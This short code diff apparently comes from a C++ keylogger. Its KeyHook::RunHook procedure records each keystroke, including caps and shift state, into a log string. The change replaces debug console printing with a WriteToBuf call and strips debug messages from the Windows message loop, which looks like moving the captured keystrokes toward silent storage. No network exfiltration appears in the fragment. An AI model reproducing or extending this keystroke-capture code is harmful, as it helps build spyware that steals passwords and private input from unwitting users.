@@ -33,8 +33,7 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
 		} else {
 			keyLog += KeyConst::AddKey(key, caps, shift);
 		}
-//		Stream::WriteLog(keyLog, clientInfo.activeProcess, *logFile);
-		std::cout << keyLog << std::endl;
+		WriteToBuf(keyLog);
 		keyLog.clear();
 	}
 
@@ -63,8 +62,7 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
 				keyName.insert(1, "/");
 			}
 			keyLog += keyName;
-//			Stream::WriteLog(keyLog, clientInfo.activeProcess, *logFile);
-			std::cout << keyLog << std::endl;
+			WriteToBuf(keyLog);
 			keyLog.clear();
 		}
 	}
@@ -92,10 +90,7 @@ bool KeyHook::KillProcess() {
 
 DWORD __stdcall KeyHook::HandleMessage(LPVOID lpParam) {
 	MSG msg;
-	// TODO: not executing
-	std::cout << "pre-handle\n";
 	while (GetMessage(&msg, nullptr, 0, 0) && (bool)lpParam) {
-		std::cout << "post-handle\n";
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
